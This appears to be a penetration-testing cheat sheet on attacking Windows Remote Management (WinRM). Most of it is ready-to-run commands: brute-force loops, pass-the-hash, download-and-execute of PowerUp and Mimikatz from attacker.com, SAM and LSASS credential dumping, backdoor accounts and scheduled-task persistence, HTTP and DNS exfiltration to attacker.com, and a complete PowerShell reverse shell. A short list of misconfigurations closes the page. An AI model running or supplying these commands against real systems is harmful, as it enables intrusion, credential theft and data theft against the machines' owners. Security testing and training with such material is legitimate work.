# WinRM

**`Default Ports: 5985 (HTTP), 5986 (HTTPS)`**

**Windows Remote Management (WinRM)** is Microsoft's implementation of the WS-Management protocol, allowing remote management of Windows machines. It's built into Windows and commonly used for remote administration, PowerShell remoting, and system automation. WinRM is the native remote management protocol for Windows and is often preferred over RDP in enterprise environments.

### Connect <a href="#connect" id="connect"></a>

#### Using evil-winrm <a href="#using-evil-winrm" id="using-evil-winrm"></a>

```
# Basic connection
evil-winrm -i target.com -u administrator -p 'password'

# With domain
evil-winrm -i target.com -u 'DOMAIN\username' -p 'password'

# Using hash (Pass-the-Hash)
evil-winrm -i target.com -u administrator -H 'NTHASH'

# Using SSL (port 5986)
evil-winrm -i target.com -u administrator -p 'password' -S

# With custom port
evil-winrm -i target.com -u administrator -p 'password' -P 5985
```

#### Using PowerShell (from Windows) <a href="#using-powershell-from-windows" id="using-powershell-from-windows"></a>

```
# Create credentials
$password = ConvertTo-SecureString "password" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("administrator", $password)

# Connect interactively
Enter-PSSession -ComputerName target.com -Credential $cred

# Run command remotely
Invoke-Command -ComputerName target.com -Credential $cred -ScriptBlock { whoami }

# Connect to multiple machines
$computers = "server1", "server2", "server3"
Invoke-Command -ComputerName $computers -Credential $cred -ScriptBlock { hostname }
```

#### Using winrs (Windows Remote Shell) <a href="#using-winrs-windows-remote-shell" id="using-winrs-windows-remote-shell"></a>

```
# Execute single command
winrs -r:http://target.com:5985 -u:administrator -p:password "whoami"

# Interactive shell
winrs -r:http://target.com:5985 -u:administrator -p:password cmd

# With domain
winrs -r:http://target.com:5985 -u:DOMAIN\username -p:password cmd
```

#### Using Ruby WinRM Library <a href="#using-ruby-winrm-library" id="using-ruby-winrm-library"></a>

```
require 'winrm'

conn = WinRM::Connection.new(
  endpoint: 'http://target.com:5985/wsman',
  user: 'administrator',
  password: 'password'
)

conn.shell(:powershell) do |shell|
  output = shell.run('Get-Process') do |stdout, stderr|
    STDOUT.print stdout
    STDERR.print stderr
  end
end
```

### Recon <a href="#recon" id="recon"></a>

#### Service Detection with Nmap <a href="#service-detection-with-nmap" id="service-detection-with-nmap"></a>

Use Nmap to detect WinRM services and identify server capabilities.

```
nmap -p 5985,5986 target.com
```

#### Banner Grabbing <a href="#banner-grabbing" id="banner-grabbing"></a>

Connect to WinRM services to gather version and service information.

**Using netcat**

```
# Using netcat
nc -vn target.com 5985
```

**Using curl**

```
# Using curl
curl http://target.com:5985/wsman

# Check WinRM configuration
curl -H "Content-Type: application/soap+xml;charset=UTF-8" \
  http://target.com:5985/wsman \
  -d '<?xml version="1.0" encoding="UTF-8"?><s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:wsmid="http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd"><s:Header/><s:Body><wsmid:Identify/></s:Body></s:Envelope>'
```

**Using nmap**

```
# Detect WinRM version
nmap -p 5985,5986 -sV target.com

# Enumerate HTTP methods and headers
nmap -p 5985 --script http-methods target.com
nmap -p 5985 --script http-headers target.com

# Check WinRM configuration
nmap -p 5985,5986 --script http-wsman-info target.com
```

#### Configuration Check <a href="#configuration-check" id="configuration-check"></a>

Check WinRM configuration and service status.

```
# Check if WinRM is running (from target)
Get-Service WinRM

# Check WinRM configuration
winrm get winrm/config

# Check listeners
winrm enumerate winrm/config/listener

# Test if WinRM is accessible from remote
Test-WSMan -ComputerName target.com
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

Use various tools for detailed WinRM enumeration and information gathering.

#### User Enumeration <a href="#user-enumeration" id="user-enumeration"></a>

Enumerate user accounts to identify potential targets for privilege escalation.

```
# List local users
Get-LocalUser

# List domain users (if domain-joined)
Get-ADUser -Filter *

# Get current user
whoami
$env:USERNAME

# Get user groups
whoami /groups
Get-LocalGroup
Get-ADGroupMember "Domain Admins"
```

#### System Information <a href="#system-information" id="system-information"></a>

Gather system information for reconnaissance and privilege escalation.

```
# System information
systeminfo
Get-ComputerInfo

# OS version
[System.Environment]::OSVersion
Get-WmiObject Win32_OperatingSystem

# Architecture
[System.Environment]::Is64BitOperatingSystem
$env:PROCESSOR_ARCHITECTURE

# Hostname
hostname
$env:COMPUTERNAME

# Domain information
Get-WmiObject Win32_ComputerSystem | Select Domain
```

#### Network Enumeration <a href="#network-enumeration" id="network-enumeration"></a>

Map internal infrastructure and identify pivot targets.

```
# Network interfaces
ipconfig /all
Get-NetIPAddress
Get-NetIPConfiguration

# Routing table
route print
Get-NetRoute

# ARP table
arp -a
Get-NetNeighbor

# Active connections
netstat -ano
Get-NetTCPConnection

# DNS cache
ipconfig /displaydns
Get-DnsClientCache
```

#### Process and Service Enumeration <a href="#process-and-service-enumeration" id="process-and-service-enumeration"></a>

Enumerate processes and services for privilege escalation vectors.

```
# List running processes
Get-Process
tasklist /v

# Enumerate Windows services
Get-Service
sc query

# List scheduled tasks
Get-ScheduledTask
schtasks /query /fo LIST /v

# List startup programs
Get-CimInstance Win32_StartupCommand
wmic startup get caption,command
```

#### Share Enumeration <a href="#share-enumeration" id="share-enumeration"></a>

Enumerate network shares and file systems.

```
# List shares
net share
Get-SmbShare
Get-WmiObject Win32_Share

# Access shares
net use \\target\share
Get-SmbMapping

# Find accessible shares on network
Get-SmbShare -CimSession (Get-ADComputer -Filter *).Name
```

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

Exploit various WinRM vulnerabilities and misconfigurations for unauthorized access.

#### Brute Force Attack <a href="#brute-force-attack" id="brute-force-attack"></a>

Brute force WinRM credentials using various tools and techniques.

**Using CrackMapExec**

```
crackmapexec winrm target.com -u users.txt -p passwords.txt
```

**Using Metasploit**

```
use auxiliary/scanner/winrm/winrm_login
set RHOSTS target.com
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

**Using Custom Script**

```
for user in $(cat users.txt); do
  for pass in $(cat passwords.txt); do
    echo "Trying $user:$pass"
    evil-winrm -i target.com -u "$user" -p "$pass" -e /tmp/test
  done
done
```

#### Pass-the-Hash <a href="#pass-the-hash" id="pass-the-hash"></a>

Exploit NTLM hash authentication for WinRM access.

```
# Using evil-winrm with NTLM hash
evil-winrm -i target.com -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'

# Using crackmapexec
crackmapexec winrm target.com -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'

# Using Metasploit
use exploit/windows/winrm/winrm_script_exec
set RHOSTS target.com
set USERNAME administrator
set HASH 32ed87bdb5fdc5e9cba88547376818d4
run
```

#### Command Execution <a href="#command-execution" id="command-execution"></a>

Execute commands remotely through WinRM.

```
# Basic command execution
Invoke-Command -ComputerName target.com -ScriptBlock { whoami }

# Multiple commands
Invoke-Command -ComputerName target.com -ScriptBlock {
  whoami
  hostname
  ipconfig
}

# Execute local script on remote
Invoke-Command -ComputerName target.com -FilePath .\script.ps1

# Download and execute
Invoke-Command -ComputerName target.com -ScriptBlock {
  IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
}
```

#### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

Escalate privileges on compromised WinRM systems.

```
# Check privileges
whoami /priv

# Check for unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Check for always install elevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

# Check for stored credentials
cmdkey /list
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\

# PowerUp enumeration
IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1')
Invoke-AllChecks
```

#### Lateral Movement <a href="#lateral-movement" id="lateral-movement"></a>

Expand access to other systems using WinRM.

```
# Execute on multiple machines
$computers = Get-ADComputer -Filter * | Select -ExpandProperty Name
Invoke-Command -ComputerName $computers -ScriptBlock { hostname }

# Pass credentials to other systems
$cred = Get-Credential
Invoke-Command -ComputerName server2 -Credential $cred -ScriptBlock {
  # Commands here
}

# Copy files and execute
Copy-Item -Path payload.exe -Destination \\target\C$\Windows\Temp\
Invoke-Command -ComputerName target -ScriptBlock {
  C:\Windows\Temp\payload.exe
}

# PSRemoting through multiple hops
# Enable CredSSP on source
Enable-WSManCredSSP -Role Client -DelegateComputer target.com
# Execute with CredSSP
$cred = Get-Credential
Invoke-Command -ComputerName target.com -Credential $cred -Authentication CredSSP -ScriptBlock {
  Invoke-Command -ComputerName target2.com -ScriptBlock { hostname }
}
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

Extract sensitive data and establish persistent access after successful WinRM exploitation.

#### Persistence <a href="#persistence" id="persistence"></a>

Create persistent backdoor access to compromised WinRM systems.

```
# Create backdoor user
net user backdoor P@ssw0rd123! /add
net localgroup administrators backdoor /add

# Scheduled task persistence
schtasks /create /tn "WindowsUpdate" /tr "powershell -enc <base64_payload>" /sc onstart /ru SYSTEM

# Registry Run key
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"

# WMI event subscription
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
  Name = "Backdoor"
  EventNameSpace = "root\cimv2"
  QueryLanguage = "WQL"
  Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
```

#### Credential Harvesting <a href="#credential-harvesting" id="credential-harvesting"></a>

Extract credentials and authentication data from compromised systems.

```
# Dump SAM hashes
reg save HKLM\SAM C:\Windows\Temp\sam
reg save HKLM\SYSTEM C:\Windows\Temp\system
reg save HKLM\SECURITY C:\Windows\Temp\security

# Download files to attacker
download C:\Windows\Temp\sam
download C:\Windows\Temp\system
download C:\Windows\Temp\security

# Dump LSASS (requires admin)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Run Mimikatz
IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds

# Extract credentials from memory
sekurlsa::logonpasswords
```

#### File Operations <a href="#file-operations" id="file-operations"></a>

Perform file operations on compromised WinRM systems.

```
# Upload file (evil-winrm)
upload /local/path/file.exe C:\Windows\Temp\file.exe

# Download file (evil-winrm)
download C:\Windows\System32\config\SAM /tmp/sam

# Copy files
Copy-Item -Path \\source\share\file.txt -Destination C:\Temp\

# Search for interesting files
Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.doc,*.xls -Recurse -ErrorAction SilentlyContinue

# Find passwords in files
Select-String -Path C:\*.txt,C:\*.config -Pattern "password"
```

#### Data Exfiltration <a href="#data-exfiltration" id="data-exfiltration"></a>

Extract and exfiltrate sensitive data from compromised systems.

```
# Compress and exfiltrate
Compress-Archive -Path C:\Sensitive\ -DestinationPath C:\Temp\data.zip
# Then download via evil-winrm
download C:\Temp\data.zip

# Exfiltrate via HTTP
$data = Get-Content C:\Sensitive\data.txt
Invoke-WebRequest -Uri "http://attacker.com/collect" -Method POST -Body $data

# Base64 encode and exfiltrate
$bytes = [System.IO.File]::ReadAllBytes("C:\Sensitive\file.exe")
$base64 = [System.Convert]::ToBase64String($bytes)
Invoke-WebRequest -Uri "http://attacker.com/collect" -Method POST -Body $base64

# DNS exfiltration
$data = Get-Content C:\data.txt
$data | ForEach-Object {
  nslookup "$_. attacker.com"
}
```

#### Reverse Shell <a href="#reverse-shell" id="reverse-shell"></a>

Establish reverse shell connections for persistent access.

```
# PowerShell reverse shell
$client = New-Object System.Net.Sockets.TCPClient('attacker-ip',4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
  $sendback = (iex $data 2>&1 | Out-String )
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
  $stream.Write($sendbyte,0,$sendbyte.Length)
  $stream.Flush()
}

# One-liner reverse shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker-ip',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Domain Reconnaissance <a href="#domain-reconnaissance" id="domain-reconnaissance"></a>

Perform Active Directory reconnaissance using WinRM access.

```
# Domain information
Get-ADDomain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Domain controllers
Get-ADDomainController -Filter *
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers

# Domain users
Get-ADUser -Filter * -Properties *
net user /domain

# Domain computers
Get-ADComputer -Filter *
net view /domain

# Domain groups
Get-ADGroup -Filter *
net group /domain

# Group members
Get-ADGroupMember "Domain Admins"
net group "Domain Admins" /domain

# GPOs
Get-GPO -All
```

#### Lateral Movement <a href="#lateral-movement-1" id="lateral-movement-1"></a>

Expand access to other systems using WinRM.

```
# Execute on multiple machines
$computers = Get-ADComputer -Filter * | Select -ExpandProperty Name
Invoke-Command -ComputerName $computers -ScriptBlock { hostname }

# Pass credentials to other systems
$cred = Get-Credential
Invoke-Command -ComputerName server2 -Credential $cred -ScriptBlock {
  # Commands here
}

# Copy files and execute
Copy-Item -Path payload.exe -Destination \\target\C$\Windows\Temp\
Invoke-Command -ComputerName target -ScriptBlock {
  C:\Windows\Temp\payload.exe
}
```

### Common evil-winrm Commands <a href="#common-evil-winrm-commands" id="common-evil-winrm-commands"></a>

| Command         | Description                | Usage                                             |
| --------------- | -------------------------- | ------------------------------------------------- |
| `upload`        | Upload file to target      | `upload /local/file.exe C:\Windows\Temp\file.exe` |
| `download`      | Download file from target  | `download C:\file.txt /tmp/file.txt`              |
| `services`      | List services              | `services`                                        |
| `menu`          | Show available commands    | `menu`                                            |
| `Bypass-4MSI`   | Bypass AMSI                | `Bypass-4MSI`                                     |
| `Invoke-Binary` | Execute binary from memory | `Invoke-Binary /path/to/binary.exe`               |

### PowerShell Remoting Cmdlets <a href="#powershell-remoting-cmdlets" id="powershell-remoting-cmdlets"></a>

| Cmdlet             | Description                | Example                                                  |
| ------------------ | -------------------------- | -------------------------------------------------------- |
| `Enter-PSSession`  | Interactive remote session | `Enter-PSSession -ComputerName target`                   |
| `Exit-PSSession`   | Exit remote session        | `Exit-PSSession`                                         |
| `Invoke-Command`   | Run command remotely       | `Invoke-Command -ComputerName target -ScriptBlock {cmd}` |
| `New-PSSession`    | Create persistent session  | `$s = New-PSSession -ComputerName target`                |
| `Remove-PSSession` | Close session              | `Remove-PSSession -Session $s`                           |
| `Get-PSSession`    | List active sessions       | `Get-PSSession`                                          |

### Useful Tools <a href="#useful-tools" id="useful-tools"></a>

| Tool              | Description            | Primary Use Case                |
| ----------------- | ---------------------- | ------------------------------- |
| evil-winrm        | WinRM shell            | Interactive remote shell        |
| crackmapexec      | Network attack tool    | Authentication and exploitation |
| Metasploit        | Exploitation framework | Various WinRM modules           |
| PowerShell Empire | Post-exploitation      | C2 and lateral movement         |
| BloodHound        | AD reconnaissance      | Domain mapping                  |
| Rubeus            | Kerberos toolkit       | Ticket manipulation             |
| Mimikatz          | Credential extractor   | Password and hash dumping       |
| PowerView         | AD enumeration         | Domain reconnaissance           |

### Security Misconfigurations to Test <a href="#security-misconfigurations-to-test" id="security-misconfigurations-to-test"></a>

* ❌ Weak or default credentials
* ❌ WinRM enabled on all machines
* ❌ Unrestricted WinRM access
* ❌ No certificate validation (HTTP instead of HTTPS)
* ❌ CredSSP enabled (credential delegation risks)
* ❌ Unencrypted traffic (port 5985)
* ❌ Excessive user permissions
* ❌ No network segmentation
* ❌ TrustedHosts set to `*`
* ❌ No logging or monitoring of WinRM sessions

<br>
